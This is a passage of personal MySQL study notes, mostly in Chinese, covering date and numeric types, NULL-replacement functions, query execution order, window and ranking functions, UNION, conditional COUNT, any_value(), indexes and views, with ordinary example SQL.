(sex = 'M' OR sex = 'F'),\n    PRIMARY KEY(id)\n);\n\n```\n\n通过字段 `last_modify_date` 定义的 `ON UPDATE CURRENT_TIMESTAMP(6)`，那么每次这条记录，则都会自动更新 `last_modify_date` 为当前时间。\n\n这样设计的好处是：用户可以知道每个用户最近一次记录更新的时间，以便做后续的处理。比如在电商的订单表中，可以方便对支付超时的订单做处理；在金融业务中，可以根据用户资金最后的修改时间做相应的资金核对等。\n\n在后面的内容中，我们也会谈到 MySQL 数据库的主从逻辑数据核对的设计实现，也会利用到`last_modify_date` 字段。\n\n### 总结\n\n日期类型通常就是使用 `DATETIME` 和 `TIMESTAMP` 两种类型，然而由于类型 `TIMESTAMP` 存在性能问题，建议你还是尽可能使用类型`DATETIME`。我总结一下今天的重点内容：\n\n- MySQL 5.6 版本开始 `DATETIME` 和 `TIMESTAMP` 精度支持到毫秒；\n- `DATETIME` 占用 8 个字节，`TIMESTAMP` 占用 4 个字节，`DATETIME(6)` 依然占用 8 个字节，`TIMESTAMP(6)` 占用 7 个字节；\n- `TIMESTAMP` 日期存储的上限为 `2038-01-19 03:14:07`，业务用 `TIMESTAMP` 存在风险；\n- 使用 `TIMESTAMP` 必须显式地设置时区，不要使用默认系统时区，否则存在性能问题，推荐在配置文件中设置参数 `time_zone = '+08:00'`；\n- 推荐日期类型使用 `DATETIME`，而不是 `TIMESTAMP` 和 `INT` 类型；\n- 表结构设计时，每个核心业务表，推荐设计一个 `last_modify_date` 的字段，用以记录每条记录的最后修改时间。\n\n\n## MySQL类型float double decimal的区别 \nfloat数值类型用于表示单精度浮点数值，而double数值类型用于表示双精度浮点数值，\nfloat和double都是浮点型，而decimal是定点型；\n\nMySQL 浮点型和定点型可以用类型名称后加（M,D）来表示，\n- M表示该值的总共长度，D表示小数点后面的长度，\n- M和D又称为精度和标度，如float(7,4), 可显示为-999.9999，\n- MySQL保存值时进行四舍五入，如果插入999.00009，则结果为999.0001。\n\n> - 精度：指数字的位数。 例如：数 123.45 的精度是 5\n> - 标度：指小数点后的数字位数。 例如：数 123.45 的标度是 2。\n\n☆FLOAT和DOUBLE在不指 定精度时，默认会按照实际的精度来显示，而DECIMAL在不指定精度时，默认整数为10，小数为0。\n\n测试1：\n```sql\nCREATE TABLE test1 (\nf FLOAT(5,2) DEFAULT NULL,\nd DOUBLE(5,2) DEFAULT NULL,\nde DECIMAL(5,2) DEFAULT NULL\n);\n```\n测试1:\n```sql\nINSERT INTO test1(f,d,de) VALUES(1.23,1.23,1.23);\n```\n数据插入正确：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182540.png)\n\n测试2:\n```sql\nINSERT INTO test1(f,d,de) VALUES(1.234,1.234,1.23);\n```\n数据插入都正确，但是f和d由于标度的限制，舍去了最后一位。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182549.png)\n\n测试3.\n```sql\nINSERT INTO test1(f,d,de) VALUES(1.234,1.234,1.234);\n```\n插入成功,但是有警告\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182600.png)\n\n测试4:\n把f，d,de的精度和标度去掉。\n```sql\nINSERT INTO test1(f,d,de) VALUES(1.234,1.234,1.234);\n```\n插入正确【f和d的数据正确插入，而de被截断】，同时也会有3一样的提示！\n浮点数如果不写精度和标度，则会按照实际显示，如果有精度和标度，则会将数据四舍五入后插入，系统不报错，定点数如果不设置精度和标度，刚按照默认的（10,0）进行操作，如果数据超过了精度和标度值，则会警告!\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182612.png)\n\n\n测试5：\n数据求SUM()时会出现不同的结果，float和double求SUM都会出现很多小数点，而decimal求SUM得到的是精准数值：\n```sql\nSELECT SUM(f),SUM(d),SUM(de) FROM test1;\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182622.png)\n\n测试6：\nfloat列类型默认长度查不到结果，必须指定精度\n```sql\nSELECT * FROM test1  WHERE f = 1.234;\n```\n查不到任何一列。\n\n\n# 常见函数\n## 日期函数\n**datediff()函数**\nMySQL DATEDIFF函数计算两个DATE，DATETIME或TIMESTAMP值之间的天数。\nMySQL DATEDIFF函数的语法如下：\n```sql\ndatediff(date_expression_1,date_expression_2);\n```\nDATEDIFF函数接受两个任何有效日期或日期时间值的参数。如果您传递DATETIME或TIMESTAMP值，则DATEDIFF函数仅将日期部分用于计算，并忽略时间部分。\n```sql\nmysql> SELECT DATEDIFF('2017-08-17','2017-08-08');\n+-------------------------------------+\n| DATEDIFF('2017-08-17','2017-08-08') |\n+-------------------------------------+\n|                                   9 |\n+-------------------------------------+\n```\n\n**year(date)**\n返回日期的年份，范围为1000〜9999，或者0日期。\n```sql\nmysql> SELECT YEAR('98-02-03');\n+---------------------------------------------------------+\n| YEAR('98-02-03')                                        |\n+---------------------------------------------------------+\n| 1998                                                    |\n+---------------------------------------------------------+\n```\n\n# 4 Ways to Replace NULL with a Different Value in MySQL\nIn MySQL, sometimes you don’t want NULL values to be returned as NULL. Sometimes you want NULL values to be returned with a different value, such as “N/A”, “Not Applicable”, “None”, or even the empty string “”.\n\nFortunately there are several ways to do this in MySQL.\n\nHere are four:\n- The `IFNULL()` function\n- The `COALESCE()` function\n- The `IF()` function combined with the IS NULL (or IS NOT NULL) operator\n- The `CASE` expression combined with the `IS NULL` (or `IS NOT NULL`) operator\nExamples of these options are below.\n\n## Sample Data\nFirst, let’s grab some sample data:\n```sql\nUSE Solutions;\nSELECT TaskCode\nFrom Tasks;\n```\nResult:\n```\n+----------+\n| TaskCode |\n+----------+\n| gar123   |\n| NULL     |\n| NULL     |\n| dog456   |\n| NULL     |\n| cat789   |\n+----------+\n```\nSo we have three NULL values and three `non-NULL` values.\n\n## The IFNULL() Function\nGiven its name, this is probably the most obvious option for replacing NULL values in MySQL. This function is basically the equivalent of `ISNULL()` in SQL Server.\n\nThe `IFNULL()` function allows you to provide two arguments. The first argument is returned only if it is not NULL. If it is NULL, then the second argument is returned instead.\n\nHere’s an example of using `IFNULL()` against our sample data set:\n```sql\nSELECT IFNULL(TaskCode, 'N/A') AS Result \nFROM Tasks;\n```\nResult:\n\n```\n+--------+\n| Result |\n+--------+\n| gar123 |\n| N/A    |\n| N/A    |\n| dog456 |\n| N/A    |\n| cat789 |\n+--------+\n```\nHere, we simply replaced NULL values with N/A.\n\n## The COALESCE() Function\nThis function is similar to the `IFNULL()` function, but slightly different. This function adheres to the ANSI  SQL standard, and it is widely deployed across various RDBMSs .\n\nThe way it works is, you provide as many arguments as you need. `COALESCE()` will then return the first `non-NULL` value in the list, or NULL if there are no `non-NULL` values.\n\nLike this:\n```sql\nSELECT COALESCE(TaskCode, 'N/A') AS Result \nFROM Tasks;\n```\nResult:\n```\n+--------+\n| Result |\n+--------+\n| gar123 |\n| N/A    |\n| N/A    |\n| dog456 |\n| N/A    |\n| cat789 |\n+--------+\n```\nSo we get exactly the same result as previously.\n\nHowever, the difference with this function is that, as mentioned, you can provide a list of arguments. The `COALESCE()` function will take whichever is the first non-NULL value.\n\nSo for example, we could add `NULL` as the first argument and place `None` before `N/A` and look what happens:\n\n```sql\nSELECT COALESCE(NULL, TaskCode, 'None', 'N/A') AS Result \nFROM Tasks;\n```\n\nResult:\n```\n+--------+\n| Result |\n+--------+\n| gar123 |\n| None   |\n| None   |\n| dog456 |\n| None   |\n| cat789 |\n+--------+\n```\nIt skipped the first `NULL` as expected, then it skipped any NULL values in the `TaskCode` column, before settling on `None`.  The `N/A` value didn’t get used in this case because `None` came first and it’s a non-NULL value.\n\n\n## The IF() Function Combined with IS NULL/IS NOT NULL\nThe `IS NULL` and `IS NOT NULL` operators allow you to test for NULL values, and present a different value depending on the outcome.\n\nWe can use these operators inside the `IF()` function, so that non-NULL values are returned, and NULL values are replaced with a value of our choosing.\n\nExample:\n```sql\nSELECT IF(TaskCode IS NOT NULL, TaskCode, 'N/A') AS Result \nFROM Tasks;\n```\n\nResult:\n```\n+--------+\n| Result |\n+--------+\n| gar123 |\n| N/A    |\n| N/A    |\n| dog456 |\n| N/A    |\n| cat789 |\n+--------+\n```\nSo the same result as with the `IFNULL()` and `COALESCE()` functions.\n\nAnd of course, we could swap `IS NOT NULL` with `IS NULL`. If we do that, we would need to swap the subsequent arguments too:\n\n```sql\nSELECT IF(TaskCode IS NULL, 'N/A', TaskCode) AS Result \nFROM Tasks;\n```\n\n## The CASE Expression Combined with IS NULL/IS NOT NULL\nAnother way to do it is to use the `CASE` expression:\n```sql\nSELECT \n    CASE \n        WHEN TaskCode IS NOT NULL THEN TaskCode \n        ELSE 'N/A' \n    END AS Result\nFROM Tasks;\n```\nResult:\n```\n+--------+\n| Result |\n+--------+\n| gar123 |\n| N/A    |\n| N/A    |\n| dog456 |\n| N/A    |\n| cat789 |\n+--------+\n```\nAs with the previous example, this could be rewritten to use `IS NULL` instead of `IS NOT NULL`:\n```\nSELECT \n    CASE \n        WHEN TaskCode IS NULL THEN 'N/A' \n        ELSE TaskCode \n    END AS Result\nFROM Tasks;\n```\n\n# MySQL的语句执行顺序\nsql执行顺序：\n- from \n- join \n- on \n- where \n- group by (开始使用select中的别名，后面的语句中都可以使用)\n- over()\n- avg,sum.... \n- having \n- select \n- distinct \n- order by\n- limit \n\n从这个顺序中我们不难发现，所有的 查询语句都是从from开始执行的，在执行过程中，<font color='red'>每个步骤都会为下一个步骤生成一个`虚拟表`</font>，这个虚拟表将作为下一个执行步骤的输入。 \n\n第一步：首先对from子句中的前两个表执行一个笛卡尔乘积，此时生成虚拟表vt1（选择相对小的表做基础表）。 \n第二步：接下来便是应用on筛选器，on 中的逻辑表达式将应用到 vt1 中的各个行，筛选出满足on逻辑表达式的行，生成虚拟表 vt2 。\n第三步：如果是inner join，则直接到第4步。 如果是outer join 那么这一步就将添加外部行，left outer jion 就把左表在第二步中过滤的行添加进来，如果是right outer join 那么就将右表在第二步中过滤掉的行添加进来，这样生成虚拟表vt3 。\n第四步：如果 from 子句中的表数目多余两个表，那么就将vt3和第三个表连接从而计算笛卡尔乘积，生成虚拟表，该过程就是一个重复1-3的步骤，最终得到一个新的虚拟表 vt3。 \n第五步：应用where筛选器，对上一步生产的虚拟表引用where筛选器，生成虚拟表vt4。on和where的最大区别在于，如果在on应用逻辑表达式那么在第三步outer join中还可以把移除的行再次添加回来，而where的移除的最终的。\n第六步：group by 子句将中的唯一的值组合成为一组，得到虚拟表vt5。如果应用了group by，<font color='red'>那么后面的所有步骤与聚合函数(count、sum、avg等)与开窗函数都只能对vt5操作。</font>原因在于最终的结果集中只为每个组包含一行。这一点请牢记。 \n第七步：应用cube或者rollup选项，为vt5生成超组，生成vt6. \n第八步：应用having筛选器，生成vt7。having筛选器是第一个也是为唯一一个应用到已分组数据的筛选器。\n第九步：处理select子句。将vt7中的在select中出现的列筛选出来。生成vt8. \n第十步：应用distinct子句，vt8中移除相同的行，生成vt9。事实上如果应用了group by子句那么distinct是多余的，原因同样在于，分组的时候是将列中唯一的值分成一组，同时只为每一组返回一行记录，那么所以的记录都将是不相同的。 \n第十一步：应用order by子句。按照order_by_condition排序vt9，此时返回的一个游标，而不是虚拟表。sql是基于集合的理论的，集合不会预先对他的行排序，它只是成员的逻辑集合，成员的顺序是无关紧要的。对表进行排序的查询可以返回一个对象，这个对象包含特定的物理顺序的逻辑组织。这个对象就叫游标。正因为返回值是游标，那么使用order by 子句查询不能应用于表表达式。排序是很需要成本的，除非你必须要排序，否则最好不要指定order by，最后，在这一步中是第一个也是**唯一一个**可以使用select列表中别名的步骤。 \n第十二步：应用top选项。此时才返回结果给请求者即用户。 \n\n**注：如果一个操作需要操作虚拟表5，而现在没有虚拟表5，则他会找最近生成的一个虚拟表**\n\n# 窗口函数\n环境搭建\n```sql\ncreate table business(\n  name varchar(10) not null,\n  orderdate varchar(30) not null,\n  cost int(5) not null\n)\n\ninsert into business (name, orderdate, cost) values(\"jack\",\"2017-01-01\",10)$\ninsert into business (name, orderdate, cost) values(\"tony\",\"2017-01-02\",15)$\ninsert into business (name, orderdate, cost) values(\"jack\",\"2017-02-03\",23)$\ninsert into business (name, orderdate, cost) values(\"tony\",\"2017-01-04\",29)$\ninsert into business (name, orderdate, cost) values(\"jack\",\"2017-01-05\",46)$\ninsert into business (name, orderdate, cost) values(\"jack\",\"2017-04-06\",42)$\ninsert into business (name, orderdate, cost) values(\"tony\",\"2017-01-07\",50)$\ninsert into business (name, orderdate, cost) values(\"jack\",\"2017-01-08\",55)$\ninsert into business (name, orderdate, cost) values(\"mart\",\"2017-04-08\",62)$\ninsert into business (name, orderdate, cost) values(\"mart\",\"2017-04-09\",68)$\ninsert into business (name, orderdate, cost) values(\"neil\",\"2017-05-10\",12)$\ninsert into business (name, orderdate, cost) values(\"mart\",\"2017-04-11\",75)$\ninsert into business (name, orderdate, cost) values(\"neil\",\"2017-06-12\",80)$\ninsert into business (name, orderdate, cost) values(\"mart\",\"2017-04-13\",94)$\n```\n\n**开窗函数使聚合函数发生的变化有如下2个**\n- 开窗函数会使得聚合函数对分组或没分组后的表的每行数据都执行一次，而不是每个组执行一次\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182632.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182640.png)\n\n- 首先，开窗函数相当于重新赋予聚合函数所要操作的数据集的范围(窗口范围)，且窗口范围可能会随着行的变化而变化\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182648.png)\n\n需求一：查询在2017年4月份购买过的顾客及总人数\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182658.png)\n\n**设置分区**\n`over(partition by 属性名1，属性名2...)`\n\n当没有设置分区时，则默认分区是整个表\n\n需求：查询顾客的购买明细即购买总额\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182705.png)\n\n需求: 查询顾客的购买明细及月购买总额\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182719.png)\n\n**分区内部排序**\n`over(order by 属性名 [desc])`\n> 注：\n当order by指定时，但没有指定窗口范围，则默认的窗口范围是从分区的起点到当前行,即默认是`rows between unbounded preceding and current row`\n当既没有使用order by, 也没有指定窗口范围时，则默认的窗口范围是分区的起点到终点，即默认是`rows between unbounded preceding and unbounded following`\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182737.png)\n\n<font color=\"red\">分区与窗口范围是不同的, 窗口范围是指的聚合函数能使用一个分区中的哪些数据</font>\n\n需求：\n查询顾客的购买明细且将每个顾客的cost按照日期进行累加\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182749.png)\n\n**注：order by相同值问题**\n当使用`over(order by age)`, 则会把age相同的多行数据看成同一行数据\n如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182758.png)\n\n**设置窗口范围**\n语法: `rows between 行1 and 行2`\n- `current row`: 当前行\n- `n preceding`: 往前n行数据\n- `n following`: 往后n行数据\n- `unbounded preceding`: 表示从前面的起点\n- `unbounded following`: 表示从后面的终点\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182807.png)\n\n注：\n`over()`中如果`oder by`关键字与`rows`关键字同时出现，则`rows`关键字**必须**要在`order by`关键值后面\n\n**获取分区中指定行的数据**\n- `lag(列名, n, [默认值])`: 获取指定列的往前第n行数据，如果没有，则用设置的默认值\n- `lead(列名, n, [默认值])`: 获取指定列的往后第n行数据，如果没有，则用设置的默认值\n- `ntile(n)`: 将分区分成n个组，各个组有编号，编号从1开始，对于每一行，ntile返回此行所属的组的编号。注意：n必须为int类型\n\n上面的函数必要要与开窗函数over()一起使用。\n\n需求：查询每个顾客上次的购买时间\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182816.png)\n\n需求：查询前20%时间的订单信息\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182826.png)\n\n## 排名函数\n<font color='red'>必须要与over()一起使用</font>\n\n三大排名函数：\n- rank()：排序相同时会重复，总数不会变\n- dense_rank()：排序相同时会重复，总数会减少\n- row_number()：会根据顺序计算\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182837.png)\n\n# MySQL UNION 操作符\nMySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。\n\n## 语法\nMySQL UNION 操作符语法格式：\n```sql\nSELECT expression1, expression2, ... expression_n\nFROM tables\n[WHERE conditions]\nUNION [ALL | DISTINCT]\nSELECT expression1, expression2, ... expression_n\nFROM tables\n[WHERE conditions];\n```\n- expression1, expression2, ... expression_n: 要检索的列。\n- tables: 要检索的数据表。\n- WHERE conditions: 可选， 检索条件。\n- DISTINCT: 可选，删除结果集中重复的数据。默认情况下 UNION 操作符已经删除了重复数据，所以 DISTINCT 修饰符对结果没啥影响。\n- ALL: 可选，返回所有结果集，包含重复数据。\n\n## 演示数据库\n在本教程中，我们将使用 RUNOOB 样本数据库。\n下面是选自 \"Websites\" 表的数据：\n```sql\nmysql> SELECT * FROM Websites;\n+----+--------------+---------------------------+-------+---------+\n| id | name         | url                       | alexa | country |\n+----+--------------+---------------------------+-------+---------+\n| 1  | Google       | https://www.google.cm/    | 1     | USA     |\n| 2  | 淘宝          | https://www.taobao.com/   | 13    | CN      |\n| 3  | 菜鸟教程      | http://www.runoob.com/    | 4689  | CN      |\n| 4  | 微博          | http://weibo.com/         | 20    | CN      |\n| 5  | Facebook     | https://www.facebook.com/ | 3     | USA     |\n| 7  | stackoverflow | http://stackoverflow.com/ |   0 | IND     |\n+----+---------------+---------------------------+-------+---------+\n```\n下面是 \"apps\" APP 的数据：\n```sql\nmysql> SELECT * FROM apps;\n+----+------------+-------------------------+---------+\n| id | app_name   | url                     | country |\n+----+------------+-------------------------+---------+\n|  1 | QQ APP     | http://im.qq.com/       | CN      |\n|  2 | 微博 APP | http://weibo.com/       | CN      |\n|  3 | 淘宝 APP | https://www.taobao.com/ | CN      |\n+----+------------+-------------------------+---------+\n3 rows in set (0.00 sec)\n```\n\n## SQL UNION 实例\n下面的 SQL 语句从 \"Websites\" 和 \"apps\" 表中选取所有不同的country（只有不同的值）：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182848.png)\n注释：UNION 不能用于列出两个表中所有的country。如果一些网站和APP来自同一个国家，每个国家只会列出一次。UNION 只会选取不同的值。请使用 UNION ALL 来选取重复的值！\n\n## SQL UNION ALL 实例\n下面的 SQL 语句使用 UNION ALL 从 \"Websites\" 和 \"apps\" 表中选取所有的country（也有重复的值）：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182857.png)\n\n## 带有 WHERE 的 SQL UNION ALL\n下面的 SQL 语句使用 UNION ALL 从 \"Websites\" 和 \"apps\" 表中选取所有的中国(CN)的数据（也有重复的值）：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182909.png)\n\n# Mysql中使用count加条件统计\n## 前言\n最近发现在处理Mysql问题时，count()函数频繁上镜，常常出现在分组统计的情景下，但是有时候并不是使用group by分好组就可以直接统计了，比如说一个常见的需求，统计每个班级男生所占的比例，这种情况一般会按照班级分组，但是分组内不但要统计班级的人数，还要统计男生的人数，也就是说统计是有条件的，之前确实没有考虑过怎样实心，后来查询了资料，总结在这里，方便日后查找使用。\nMysql中count()函数的一般用法是统计字段非空的记录数，所以可以利用这个特点来进行条件统计，注意这里如果字段是NULL就不会统计，但是false是会被统计到的，记住这一点，我们接下来看看几种常见的条件统计写法。\n\n## 准备工作\n新建一个Mysql数据表a，包含id和num两个字段\n```sql\nmysql> create table a(id int, num int);\nQuery OK, 0 rows affected (0.04 sec)\n```\n插入测试数据，为了看count()函数的效果，我们插入两个空数据\n```sql\nmysql> insert into a values (1,100),(2,200),(3,300),(4,300),(8,null),(9,null);\nQuery OK, 6 rows affected (0.01 sec)\nRecords: 6  Duplicates: 0  Warnings: 0\n```\n查询表a中的数据，与后面的统计做比较\n```sql\nmysql> select * from a;\n+----+------+\n| id | num  |\n+----+------+\n|  1 |  100 |\n|  2 |  200 |\n|  3 |  300 |\n|  4 |  300 |\n|  8 | NULL |\n|  9 | NULL |\n+----+------+\n6 rows in set (0.09 sec)\n```\n调用count()函数看效果，如果使用`count(*)`会查询出所有的记录数，但如果使用count(num)发现只有4条数据，num为NULL的记录并没有统计上\n```sql\nmysql> select count(*) from a;\n+----------+\n| count(*) |\n+----------+\n|        6 |\n+----------+\n1 row in set (0.03 sec)\n\nmysql> select count(num) from a;\n+------------+\n| count(num) |\n+------------+\n|          4 |\n+------------+\n1 row in set (0.04 sec)\n```\n\n## 条件统计\ncount()函数中使用条件表达式加or null来实现，作用就是当条件不满足时，函数变成了count(null)不会统计数量\n```sql\nmysql> select count(num > 200 or null) from a;\n+--------------------------+\n| count(num > 200 or null) |\n+--------------------------+\n|                        2 |\n+--------------------------+\n1 row in set (0.22 sec)\n```\ncount()函数中使用if表达式来实现，当条件满足是表达式的值为非空，条件不满足时表达式值为NULL;\n```sql\nmysql> select count(if(num > 200, 1, null)) from a;\n+-------------------------------+\n| count(if(num > 200, 1, null)) |\n+-------------------------------+\n|                             2 |\n+-------------------------------+\n1 row in set (0.05 sec)\n```\ncount()函数中使用case when表达式来实现，当条件满足是表达式的结果为非空，条件不满足时无结果默认为NULL;\n```sql\nmysql> select count(case when num > 200 then 1 end) from a;\n+---------------------------------------+\n| count(case when num > 200 then 1 end) |\n+---------------------------------------+\n|                                     2 |\n+---------------------------------------+\n1 row in set (0.07 sec)\n```\n## 总结\n使用count()函数实现条件统计的基础是对于值为NULL的记录不计数，常用的有以下三种方式，假设统计num大于200的记录\n```sql\nselect count(num > 200 or null) from a;\nselect count(if(num > 200, 1, null)) from a\nselect count(case when num > 200 then 1 end) from a\n```\n\n# mysql中any_value()函数\n对于如下mysql语句:\n```sql\nSELECT \n    province_code,\n    province_name\nFROM t_mip_base_area\nGROUP BY province_code\n```\n则报：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220223170445.png)\n\n总结：\n1. MySQL5.7之后，`sql_mode`中`ONLY_FULL_GROUP_BY`模式默认设置为打开状态。\n2. `ONLY_FULL_GROUP_BY`的语义就是确定select target list中的所有列的值都是明确语义，简单的说来，在此模式下，**target list中的值要么是来自于聚合函数（sum、avg、max等）的结果，要么是来自于group by list中的表达式的值**\n3. MySQL提供了`any_value()`函数来抑制`ONLY_FULL_GROUP_BY`值被拒绝\n4. `any_value()`会选择被分到同一组的数据里第一条数据的指定列值作为返回数据\n\n正确写法：\n```sql\nSELECT \n    province_code,\n    any_value(province_name)\nFROM t_mip_base_area\nGROUP BY province_code\n```\n\n# 索引\nMySQL官方对索引的定义为：索引（index）是帮助MySQL高效获取数据的数据结构（有序）。在数据之外，数据库系统还维护者满足特定查找算法的数据结构，这些数据结构以某种方式引用（指向）数据， 这样就可以在这些数据结构上实现高级查找算法，这种数据结构就是索引。如下面的==示意图==所示 : \n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182920.png)\n\n左边是数据表，一共有两列七条记录，最左边的是数据记录的物理地址（注意逻辑上相邻的记录在磁盘上也并不是一定物理相邻的）。为了加快Col2的查找，可以维护一个右边所示的二叉查找树，每个节点分别包含索引键值和一个指向对应数据记录物理地址的指针，这样就可以运用二叉查找快速获取到相应数据。\n一般来说索引本身也很大，不可能全部存储在内存中，因此索引往往以索引文件的形式存储在磁盘上。索引是数据库中用来提高性能的最常用的工具。\n\n**索引优势劣势**\n优势\n- 类似于书籍的目录索引，提高数据检索的效率，降低数据库的IO成本。\n- 通过索引列对数据进行排序，降低数据排序的成本，降低CPU的消耗。\n\n劣势\n- 实际上索引也是一张表，该表中保存了主键与索引字段，并指向实体类的记录，所以索引列也是要占用空间的。\n- 虽然索引大大提高了查询效率，同时却也降低更新表的速度，如对表进行INSERT、UPDATE、DELETE。因为更新表时，MySQL 不仅要保存数据，还要保存一下索引文件每次更新添加了索引列的字段，都会调整因为更新所带来的键值变化后的索引信息。\n\n**索引结构**\n索引是在MySQL的存储引擎层中实现的，而不是在服务器层实现的。所以每种存储引擎的索引都不一定完全相同，也不是所有的存储引擎都支持所有的索引类型的。MySQL目前提供了以下4种索引：\n- BTREE 索引 ： 最常见的索引类型，大部分索引都支持 B 树索引。\n- HASH 索引：只有Memory引擎支持 ， 使用场景简单 。\n- R-tree 索引（空间索引）：空间索引是MyISAM引擎的一个特殊索引类型，主要用于地理空间数据类型，通常使用较少，不做特别介绍。\n- Full-text （全文索引） ：全文索引也是MyISAM的一个特殊索引类型，主要用于全文索引，InnoDB从Mysql5.6版本开始支持全文索引。\n\nMyISAM、InnoDB、Memory三种存储引擎对各种索引类型的支持\n\n| 索引        | InnoDB引擎      | MyISAM引擎 | Memory引擎 |\n| ----------- | --------------- | ---------- | ---------- |\n| BTREE索引   | 支持            | 支持       | 支持       |\n| HASH 索引   | 不支持          | 不支持     | 支持       |\n| R-tree 索引 | 不支持          | 支持       | 不支持     |\n| Full-text   | 5.6版本之后支持 | 支持       | 不支持     |\n\n我们平常所说的索引，如果没有特别指明，都是指B+树（多路搜索树，并不一定是二叉的）结构组织的索引。其中聚集索引、复合索引、前缀索引、唯一索引默认都是使用 B+tree 索引，统称为 索引。\n\n**索引类型**\n- 普通索引：这是最基本的索引类型，而且它没有唯一性之类的限制\n- 唯一性索引：这种索引和前面的“普通索引”基本相同，但有一个区别：索引列的所有值都只能出现一次，即必须唯一。创建索引时指定unique即可创建唯一性索引\n\n**主键始终被索引。对于MyISAM和InnoDB，这是相同的，并且通常对所有支持索引的存储引擎都是如此。**\n\n**索引分类**\n- 单值索引 ：即一个索引只包含单个列，一个表可以有多个单列索引\n- 复合索引 ：即一个索引包含多个列\n\n## 索引语法\n索引在创建表的时候，可以同时创建， 也可以随时增加新的索引。\n准备环境:\n```SQL\ncreate database demo_01 default charset=utf8mb4;\n\nuse demo_01;\n\nCREATE TABLE city (\n  city_id int(11) NOT NULL AUTO_INCREMENT,\n  city_name varchar(50) NOT NULL,\n  country_id int(11) NOT NULL,\n  PRIMARY KEY (city_id)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n\nCREATE TABLE country(\n  country_id int(11) NOT NULL AUTO_INCREMENT,\n  country_name varchar(100) NOT NULL,\n  PRIMARY KEY (country_id)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n\n\ninsert into city (city_id, city_name, country_id) values(1,'西安',1);\ninsert into city (city_id, city_name, country_id) values(2,'NewYork',2);\ninsert into city (city_id, city_name, country_id) values(3,'北京',1);\ninsert into city (city_id, city_name, country_id) values(4,'上海',1);\n\ninsert into country (country_id, country_name) values(1,'China');\ninsert into country (country_id, country_name) values(2,'America');\ninsert into country (country_id, country_name) values(3,'Japan');\ninsert into country (country_id, country_name) values(4,'UK');\n```\n\n**创建索引**\n语法 ： \t\n```sql\ncreate \t[UNIQUE|FULLTEXT|SPATIAL]  index 索引名\n[USING  索引结构(例如BTREE)]\non 表名(列名,...)\nindex_col_name : column_name[(length)][ASC | DESC]\n```\n\n示例 ： 为city表中的city_name字段创建索引 ；\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182936.png)\n​\t\n\n**查看索引**\n语法： \n```sql\nshow index from  表名;\n```\n示例：查看city表中的索引信息；\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182947.png)\n\n\n**删除索引**\n语法 ：\n```sql\nDROP INDEX 索引名 ON 表名;\n```\n示例 ： 想要删除city表上的索引idx_city_name，可以操作如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182956.png)\n\n**修改索引**\n```sql\nalter  table  表名  add  [unique|index|fulltext] 索引名(列名);\n添加[unique|index|fulltext]索引\n\nalter index 旧索引名 rename to 新索引名\n重命名索引名\n```\n\n# 视图\n​视图（View）是一种虚拟存在的表。视图并不在数据库中实际存在，行和列数据来自定义视图的查询中使用的表，并且是在使用视图时动态生成的。通俗的讲，视图就是一条SELECT语句执行后返回的结果集。所以我们在创建视图的时候，主要的工作就落在创建这条SQL查询语句上。\n\n视图相对于普通的表的优势主要包括以下几项。\n- 简单：使用视图的用户完全不需要关心后面对应的表的结构、关联条件和筛选条件，对用户来说已经是过滤好的复合条件的结果集。\n- 安全：使用视图的用户只能访问他们被允许查询的结果集，对表的权限管理并不能限制到某个行某个列，但是通过视图就可以简单的实现。\n- 数据独立：一旦视图的结构确定了，可以屏蔽表结构变化对用户的影响，源表增加列对视图没有影响；源表修改列名，则可以通过修改视图来解决，不会造成对访问者的影响。\n\n**创建或者修改视图**\n创建视图的语法为：\n```sql\nCREATE [OR REPLACE] [ALGORITHM = {UNDEFINED | MERGE | TEMPTABLE}]\nVIEW view_name [(column_list)]\nAS select_statement\n[WITH [CASCADED | LOCAL] CHECK OPTION]\n```\n\n修改视图的语法为：\n```sql\nALTER [ALGORITHM = {UNDEFINED | MERGE | TEMPTABLE}]\nVIEW view_name [(column_list)]\nAS select_statement\n[WITH [CASCADED | LOCAL] CHECK OPTION]\n```\n```\n选项 : \n\tWITH [CASCADED | LOCAL] CHECK OPTION 决定了是否允许更新数据使记录不再满足视图的条件。\n\tLOCAL ： 只要满足本视图的条件就可以更新。\n\tCASCADED ： 必须满足所有针对该视图的所有视图的条件才可以更新。 默认值.\n```\n\n示例 , 创建city_country_view视图 , 执行如下SQL : \n```sql\ncreate or replace view city_country_view \nas \nselect t.*,c.country_name from country c , city t where c.country_id = t.country_id;\n```\n\n查询视图 : \n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183006.png)\n\n**查看视图**\n​\t从 MySQL 5.1 版本开始，使用 SHOW TABLES 命令的时候不仅显示表的名字，同时也会显示视图的名字，而不存在单独显示视图的 SHOW VIEWS 命令。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183017.png)\n\n同样，在使用 SHOW TABLE STATUS 